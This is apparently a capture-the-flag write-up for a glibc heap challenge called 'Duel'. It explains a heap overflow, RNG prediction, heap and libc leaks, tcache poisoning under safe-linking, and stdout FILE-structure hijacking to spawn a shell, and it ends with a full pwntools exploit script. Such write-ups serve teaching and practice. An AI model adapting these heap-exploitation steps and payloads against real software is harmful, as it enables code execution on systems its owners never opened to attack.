# Duel

## Description
Can you survive the duel, and bring back flag to your homeland?

## Analysis

### Overview

The binary contains:
- An array `spells[8]` of pointers to dynamically allocated buffers
- A menu for operating on indices `0..7`
- A global array of constant spell names

  ```c
  const char *spell_texts[8] = {
      "Fireball",
      "Rasengan",
      "AvadaKedavra",
      "Kamehameha",
      "Expelliarmus",
      "arcane_blast_of_the_void!",
      "LIGHT",
      "DARK"
  };
  ```

### Vulnerability

When choosing **Learn spell** (menu 1), the program has a heap overflow bug:

  ```c
  int learn_spell(int idx)
  {
      int r = rand() % 8;
      const char *text = spell_texts[r];      // fixed internal string

      printf("guess: ");
      char user_pattern[0x100];
      read_line(user_pattern, 0x100);         // your input

      int pos = 0;
      int res = mini_regex_match(text, user_pattern, &pos);
      if (res < 0)
          return -1;

      // BUG: res is *position* in text, not length, but used as malloc size
      void *ptr = malloc(res);
      // BUG: memcpy size is strlen(text) or similar, not bounded by res
      memcpy(ptr, user_pattern, strlen(text));

      spells[idx] = ptr;
  }
  ```

  **Core Bug**: `mini_regex_match` returns the match position in text, which is used as `malloc` size. However, the copy size is based on the full spell name length, creating a heap overflow that overwrites chunk metadata.

**Other Menu Options**:
- **Forget spell** (3): `free(spells[idx])`
- **Remember spell** (4): Prints spell content - can leak heap/libc from freed chunks
- **Special spell** (5): Custom `malloc`/`memcpy` for precise metadata overwrite
- **Menu 6**: Exit path with two `malloc(0xe8)` calls + stdout cleanup → FSOP target via `_IO_2_1_stdout_`

### RNG Control

The game uses `rand() % 8` to select spells. We need specific lengths:
- `"arcane_blast_of_the_void!"` (index 5, length 0x19)
- `"Rasengan"` (index 1, length 0x8)

**RNG Synchronization**:
```python
libll = CDLL('./libc.so.6')
libll.srand(time.time())
```

Use **dodge** (menu 2) to burn `rand()` calls until we get the desired spell index, making behavior deterministic.

### Heap Overflow Technique

**Vulnerable Code**:
```c
res = mini_regex_match(text, pattern, &pos);  // res = match position
ptr = malloc(res);                              // small allocation
memcpy(ptr, pattern, strlen(text));             // large copy → overflow
```

**Attack Pattern**: Use regex patterns to control both allocation size and overflow content:
```python
payload = b'.?' * 0x0c + p8(0x21) + b'?'  # Sets next chunk size to 0x21
```

This creates controlled overflows into adjacent chunk metadata.

### Information Leaks

**Heap Base Leak**:
- Free a tcache chunk: `fd = heap_base >> 12` (safe-linking with NULL next)
- Use `remember` to read freed chunk contents
- Extract and decode: `heap_base = (leaked_fd << 12)`

**Libc Base Leak**:
- Create fake unsorted bin chunk (size 0xa1)
- When freed, contains `main_arena` pointers
- Small allocation + `remember` reveals libc address
- Calculate: `libc_base = leak - main_arena_offset`

### Exploit Strategy

**1. Leak Information**:
- Heap base: `heap_base = (fd_leak << 12)`
- Libc base: `libc_base = main_arena_leak - 0x203bb0`

**2. Prepare 0xf0 Chunks**:
- Create and free two 0xf0-sized chunks for tcache poisoning
- Menu 6 will allocate `malloc(0xe8)` twice → uses our corrupted tcache

**3. Tcache Poisoning**:
- Safe-linking: `fd = (chunk_addr >> 12) ^ target`
- Target: `_IO_2_1_stdout_`
- Overflow first 0xf0 chunk's `fd` to point to stdout

### Tcache poisoning with safe‑linking

We use the **special spell** (menu 5) to overwrite the first 0xf0 chunk’s header (which includes the `fd` pointer stored by tcache).

Safe‑linking formula in glibc 2.32+:

```c
fd = PROTECT_PTR(chunk_addr, target) = ((uintptr_t)chunk_addr >> 12) ^ target;
```

So if we want `fd` to point to `target = &_IO_2_1_stdout_`, we must store:

```c
fd = ((chunk_addr >> 12) ^ target);
```

We know:

- `chunk_addr` ≈ `heap_base + 0x400` (from heap layout we observed).
- `target` = `_IO_2_1_stdout_`.

In the exploit:

```python
stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_']
mangled = stdout_addr ^ ((heap_base + 0x400) >> 12)

payload = b"A" * 0x18 + p64(0xf1) + p64(mangled)
special(5, 0x28, payload)
```

This overwrites the chunk header for the first 0xf0 tcache entry:

- `prev_size` (ignored)
- `size = 0xf1` (0xf0 used size + inuse bit)
- `fd = mangled`.

Now, when the program later asks for `malloc(0xe8)`:

1. The first returned pointer will be that corrupted chunk (we ignore its content).
2. The second `malloc(0xe8)` will follow its `fd`, which now points to `_IO_2_1_stdout_`.

Thus, the second allocation from menu 6 returns a pointer **right into the `stdout` FILE structure**, letting us **overwrite it**.

### FSOP: hijacking stdout

Once `malloc` returns `_IO_2_1_stdout_`, the code expects a normal heap chunk and later copies user‑controlled data into it. We craft a fake `FILE` structure that, when glibc does stream operations (printing, flushing, closing) on stdout at program exit, will end up calling `system("||sh")`.

In pwntools, building a `FILE` structure is straightforward:

```python
from pwn import FileStructure

_IO_2_1_stdout_ = stdout_addr
system_addr = libc_base + libc.symbols['system']

fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b'||sh') << 32)  # magic + "||sh"
fp._IO_read_end = system_addr
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_
fp.vtable = libc_base + libc.symbols['_IO_wfile_jumps'] - 0x20

payload = bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)
```

Here:

- `fp.flags` is set to a standard `stdout` read/write flag pattern (`0xfbad2484`) plus an encoded `"||sh"` in the upper bits, used as the argument to `system`.
- `fp._IO_read_end` is abused to hold the address of `system`.
- `fp.vtable` points inside `_IO_wfile_jumps`, but shifted such that one of the early virtual calls ends up using our crafted pointers.

Finally we send it during menu 6 interaction:

```python
sa(b">> ", b"6")         # choose option 6 (exit)
sa(b">> ", b"A" * 8)     # satisfy some read for the first malloc
sa(b">> ", payload)      # overwrite stdout with our fake FILE
```

During program termination, glibc performs cleanup / flush on `stdout`, hits the corrupted vtable, and effectively executes:

```c
system("||sh");
```

## Solve

Below is the final exploit script used to solve the challenge, combining all of the steps above:

- RNG synchronization and steering `rand()%8` via `dodge`.
- Heap layout manipulation for heap leak.
- Fake unsorted bin and libc leak.
- Tcache poisoning with safe‑linking.
- FSOP on `_IO_2_1_stdout_` to get `system("||sh")`.

```python
#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL
import math, time

# ----------------------------------------------------------------------
# Setup
# ----------------------------------------------------------------------
exe = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6')
context.binary = exe
context.log_level = 'info'

HOST = 'remote.infoseciitr.in'
PORT = 8006

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        # run with the provided loader + libc locally
        return process(['./ld-linux-x86-64.so.2', '--library-path', '.', exe.path])

# shorthand
def s(data):              p.send(data)
def sa(delim, data):      p.sendafter(delim, data)
def sl(data):             p.sendline(data)
def sla(delim, data):     p.sendlineafter(delim, data)
def rcu(delim):           return p.recvuntil(delim)

# ----------------------------------------------------------------------
# Menu wrappers
# ----------------------------------------------------------------------
def learn(idx, guess, spell_len):
    """
    Menu 1: Learn the spell

    The binary does: val = rand() % 8; spell = spells[val];
    We want a specific spell length to control memcpy size:

      spell_len == 0x19 -> index 5: "arcane_blast_of_the_void!" (len 25)
      spell_len == 0x8  -> index 1: "Rasengan"                (len 8)

    We keep calling "dodge" (menu 2) until rand()%8 hits the index we want.
    """
    if spell_len == 0x19:
        target = 5
    elif spell_len == 0x8:
        target = 1
    else:
        raise ValueError("unexpected spell_len")

    val = libll.rand() % 8
    while val != target:
        dodge()              # menu 2, burns one rand()
        val = libll.rand() % 8

    sa(b'>> ', b'1')
    sla(b'>> ', str(idx).encode())
    sla(b'guess: ', guess)

def dodge():
    sa(b'>> ', b'2')

def forget(idx):
    sa(b'>> ', b'3')
    sla(b'>> ', str(idx).encode())

def remember(idx):
    sa(b'>> ', b'4')
    sla(b'>> ', str(idx).encode())

def special(idx, size, spell):
    sa(b'>> ', b'5')
    sla(b'>> ', str(idx).encode())
    sla(b'>> ', str(size).encode())
    sla(b'spell: ', spell)

# ----------------------------------------------------------------------
# Main exploit
# ----------------------------------------------------------------------
p = start()

# local copy of the SAME libc used by the binary, for rand() predict
libll = CDLL('./libc.so.6')
now = int(math.floor(time.time()))
libll.srand(now)

# ----------------------------------------------------------------------
# 1) Heap leak via tcache entry
# ----------------------------------------------------------------------
payload = b'.?' * 0x0c + p8(0x21) + b'?'

for i in range(0, 3):
    learn(i, payload, 0x19)
for i in range(3, 8):
    learn(i, payload, 0x19)

forget(0)
payload2 = b'.?' * 0x0c + p8(0x31) + b'?'
learn(0, payload2, 0x19)
forget(2)
remember(1)

rcu(b"spell >> ")
p.recvn(0x20)
heap_leak = u64(p.recvn(8))
heap_base = heap_leak << 12
log.info(f'heap_base = {heap_base:#x}')

# ----------------------------------------------------------------------
# 2) Fill tcache for size 0xa0 to avoid consolidation issues
# ----------------------------------------------------------------------
forget(0)
payload = b'.?' * 0x0c + p8(0x21) + b'?'
learn(0, payload, 0x19)
learn(2, payload, 0x19)

for i in range(6, -1, -1):
    forget(i)
    payload = b'.?' * 0x0c + p8(0xa1) + b'?'
    learn(i, payload, 0x19)
    forget(i + 1)

    # restore original layout
    forget(i)
    payload = b'.?' * 0x0c + p8(0x21) + b'?'
    learn(i, payload, 0x19)

for i in range(1, 8):
    payload = b'.?' * 0x0c + p8(0x21) + b'?'
    learn(i, payload, 0x19)

# ----------------------------------------------------------------------
# 3) Libc leak via fake unsorted bin
# ----------------------------------------------------------------------
forget(1)
payload = b'.?' * 0x0c + p8(0xa1) + b'?'
learn(1, payload, 0x19)
forget(2)           # this becomes a (fake) unsorted-bin chunk

# prepare two 0xf0 tcache chunks
forget(4)
payload = b'.?' * 0x0c + p8(0xf1) + b'?'
learn(4, payload, 0x19)
forget(5)           # tcache[0xf0] entry 0

forget(3)
payload = b'.?' * 0x0c + p8(0xf1) + b'?'
learn(3, payload, 0x19)
forget(4)           # tcache[0xf0] entry 1

# leak libc from the unsorted-bin chunk at index 2
payload = b'.?' * (0x8 // 2)
learn(2, payload, 0x8)
remember(2)

rcu(b"spell >> ")
p.recvn(0x8)
libc_leak = u64(p.recvn(8))
libc_base = libc_leak - 0x203bb0      # 0x203bb0 = main_arena + 0xf0 in this libc
log.info(f'libc_base = {libc_base:#x}')

# ----------------------------------------------------------------------
# 4) Tcache poisoning for 0xf0 chunks → target _IO_2_1_stdout_
# ----------------------------------------------------------------------
stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_']
system_addr = libc_base + libc.symbols['system']

# safe-linking: PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr
# here pos is roughly heap_base + 0x400 for the first 0xf0 tcache entry
mangled = stdout_addr ^ ((heap_base + 0x400) >> 12)
payload = b"A" * 0x18 + p64(0xf1) + p64(mangled)

# write into tcache entry using add_special_spell
special(5, 0x28, payload)

# ----------------------------------------------------------------------
# 5) FSOP on stdout via the exit path (menu 6)
# ----------------------------------------------------------------------
sa(b'>> ', b'6')
# first malloc(0xe8) – data not important
sa(b'>> ', b'A' * 8)

_IO_2_1_stdout_ = stdout_addr

# Build fake FILE structure for stdout
fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b'||sh') << 32)    # "||sh" as part of flags
fp._IO_read_end = system_addr                   # call system()
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_
fp.vtable = libc_base + libc.symbols['_IO_wfile_jumps'] - 0x20

payload = bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)
sa(b'>> ', payload)

p.interactive()
```
